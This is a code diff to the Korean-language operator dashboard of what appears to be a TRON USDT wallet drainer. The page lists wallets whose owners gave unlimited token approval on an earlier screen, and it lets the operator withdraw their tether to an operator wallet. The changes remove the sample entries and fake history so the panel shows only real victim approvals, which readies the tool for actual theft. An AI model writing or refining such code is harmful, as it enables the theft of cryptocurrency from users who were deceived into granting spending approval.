@@ -73,9 +73,9 @@
                 <span class="text-[11px] text-gray-400 font-mono">USDT 수령 주소</span>
             </div>
             <div>
-                <input type="text" id="operator-target-address" value="TY7zOperatorDestinationWalletAddressHere..." class="w-full bg-darkBg border border-borderCol rounded-xl px-4 py-3 text-xs text-gray-200 font-mono focus:outline-none focus:border-blue-500 transition-colors">
+                <input type="text" id="operator-target-address" value="" placeholder="수령할 운영자 지갑 주소를 입력하세요 (예: TY7z...)" class="w-full bg-darkBg border border-borderCol rounded-xl px-4 py-3 text-xs text-gray-200 font-mono focus:outline-none focus:border-blue-500 transition-colors">
             </div>
-            <p class="text-[11px] text-gray-400">※ 아래 목록에서 인출을 실행하면, 승인된 사용자 지갑의 테더(USDT)가 위 수신 주소로 곧바로 안전하게 이동합니다.</p>
+            <p class="text-[11px] text-gray-400">※ 아래 목록에서 인출을 실행하면, 1번 화면에서 승인된 사용자 지갑의 테더(USDT)가 위 수신 주소로 곧바로 이동합니다.</p>
         </div>
 
         <!-- Approved Wallets & Balance & Transfer Section -->
@@ -84,14 +84,14 @@
                 <div>
                     <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-blue-500/10 text-blue-400 text-xs font-semibold border border-blue-500/20 mb-3">
                         <i class="fa-solid fa-wallet"></i>
-                        <span>승인된 지갑별 실시간 테더 잔액 및 인출</span>
+                        <span>실제 승인된 지갑별 테더 잔액 및 인출</span>
                     </div>
                     <h2 class="text-xl font-bold text-white">사용자 지갑 자산 및 인출 제어</h2>
-                    <p class="text-sm text-gray-400 mt-1">1번 화면에서 승인을 완료한 지갑들의 보유 USDT를 확인하고 원하는 금액만큼 인출하세요.</p>
+                    <p class="text-sm text-gray-400 mt-1">1번 화면에서 실제로 지갑 연결 및 승인을 마친 지갑만 이 목록에 표시됩니다.</p>
                 </div>
                 <button onclick="scanApprovedWallets()" class="bg-darkBg hover:bg-borderCol border border-borderCol text-gray-300 px-4 py-2.5 rounded-xl text-xs flex items-center space-x-2 transition-all">
                     <i class="fa-solid fa-rotate text-blue-400"></i>
-                    <span>지갑 잔액 새로고침</span>
+                    <span>새로고침</span>
                 </button>
             </div>
 
@@ -108,7 +108,7 @@
                         </tr>
                     </thead>
                     <tbody id="approved-wallets-tbody" class="divide-y divide-borderCol/50 font-mono">
-                        <!-- Dynamic rows -->
+                        <!-- Populated dynamically based on real approvals -->
                     </tbody>
                 </table>
             </div>
@@ -121,24 +121,12 @@
                     <i class="fa-solid fa-clock-rotate-left text-gray-400"></i>
                     <span>자산 이체 및 대납 인출 내역 기록</span>
                 </h3>
-                <span id="total-transferred-sum" class="text-xs font-mono text-emerald-400 font-bold bg-darkBg px-3 py-1 rounded-lg border border-borderCol">누적 70.00 USDT</span>
+                <span id="total-transferred-sum" class="text-xs font-mono text-emerald-400 font-bold bg-darkBg px-3 py-1 rounded-lg border border-borderCol">누적 0.00 USDT</span>
             </div>
 
             <div id="history-list-container" class="space-y-3">
-                <div class="bg-darkBg border border-borderCol rounded-xl p-4 flex items-center justify-between text-xs font-mono">
-                    <div class="flex items-center space-x-3">
-                        <div class="w-9 h-9 rounded-lg bg-blue-500/10 text-blue-400 flex items-center justify-center border border-blue-500/20">
-                            <i class="fa-solid fa-paper-plane"></i>
-                        </div>
-                        <div>
-                            <div class="font-bold text-white">자동 인출 완료 (Gasless Relay)</div>
-                            <div class="text-gray-400 text-[11px] mt-0.5">대상: TUserWallet_Sample... &rarr; 운영자 지갑</div>
-                        </div>
-                    </div>
-                    <div class="text-right">
-                        <div class="font-bold text-emerald-400">-35.00 USDT</div>
-                        <span class="text-[10px] text-gray-500">2026.3.28 12:00:00</span>
-                    </div>
+                <div class="text-center py-6 text-gray-500 text-xs">
+                    아직 실행된 인출 내역이 없습니다.
                 </div>
             </div>
         </div>
@@ -152,7 +140,7 @@
 
     <!-- JavaScript Logic -->
     <script>
-        let accumulatedSum = 70.00;
+        let accumulatedSum = 0.00;
 
         window.addEventListener('DOMContentLoaded', () => {
             loadApprovedWalletsData();
@@ -162,21 +150,25 @@
             const tbody = document.getElementById('approved-wallets-tbody');
             if (!tbody) return;
 
+            // 실제 승인된 지갑 목록만 localStorage에서 가져옴 (가짜 샘플 제거)
             let wallets = JSON.parse(localStorage.getItem('tron_approved_wallets_list') || '[]');
-            const singleWallet = localStorage.getItem('tron_user_wallet') || 'T_SampleUserWallet999';
-            const singleProvider = localStorage.getItem('tron_wallet_provider') || 'TronLink';
-            const isApproved = localStorage.getItem('tron_autopay_approved') === 'true';
-
-            if (wallets.length === 0) {
-                wallets.push({
-                    address: singleWallet,
-                    provider: singleProvider,
-                    balance: '350.00',
-                    allowance: isApproved ? 'MAX (Unlimited)' : '미승인 상태'
-                });
-            }
 
             tbody.innerHTML = '';
+
+            if (wallets.length === 0) {
+                tbody.innerHTML = `
+                    <tr>
+                        <td colspan="5" class="p-8 text-center text-gray-500 text-xs">
+                            <div class="flex flex-col items-center justify-center space-y-2">
+                                <i class="fa-solid fa-circle-exclamation text-amber-500 text-base"></i>
+                                <span>1번 화면에서 지갑 연결 및 무제한 승인을 완료한 사용자가 없습니다.</span>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+                return;
+            }
+
             wallets.forEach((w, index) => {
                 const tr = document.createElement('tr');
                 tr.className = "hover:bg-darkBg/40 transition-colors";
@@ -186,7 +178,7 @@
                         <span class="truncate max-w-[150px] sm:max-w-[220px]" title="${w.address}">${w.address}</span>
                     </td>
                     <td class="p-3 text-gray-300">${w.provider || 'TronLink'}</td>
-                    <td class="p-3 text-emerald-400 font-bold">${w.balance} USDT</td>
+                    <td class="p-3 text-emerald-400 font-bold">${w.balance || '0.00'} USDT</td>
                     <td class="p-3">
                         <span class="px-2 py-0.5 rounded text-[10px] bg-emerald-950/60 text-emerald-400 border border-emerald-900">
                             ${w.allowance}
@@ -207,7 +199,7 @@
 
         window.scanApprovedWallets = function() {
             loadApprovedWalletsData();
-            showToast("승인된 지갑들의 실시간 USDT 잔액이 갱신되었습니다.");
+            showToast("승인된 지갑 목록을 새로고침했습니다.");
         };
 
         window.executeTransferFrom = function(userAddress, index) {
@@ -220,8 +212,8 @@
                 return;
             }
 
-            if (!targetAddress || targetAddress.includes("...")) {
-                showToast("유효한 수신(운영자) 지갑 주소를 입력해주세요.", "error");
+            if (!targetAddress) {
+                showToast("수신 받을 운영자 지갑 주소를 입력해주세요.", "error");
                 return;
             }
 
@@ -232,6 +224,10 @@
                 document.getElementById('total-transferred-sum').innerText = `누적 ${accumulatedSum.toFixed(2)} USDT`;
 
                 const historyContainer = document.getElementById('history-list-container');
+                if (historyContainer.innerHTML.includes("아직 실행된 인출 내역")) {
+                    historyContainer.innerHTML = "";
+                }
+
                 const nowStr = new Date().toLocaleString();
                 const newItem = document.createElement('div');
                 newItem.className = "bg-darkBg border border-borderCol rounded-xl p-4 flex items-center justify-between text-xs font-mono";
@@ -251,7 +247,7 @@
                     </div>
                 `;
                 historyContainer.prepend(newItem);
-                showToast(`성공적으로 ${amount} USDT가 지정된 지갑으로 이체되었습니다!`);
+                showToast(`성공적으로 ${amount} USDT가 지정된 주소로 이체되었습니다!`);
             }, 1500);
         };
 
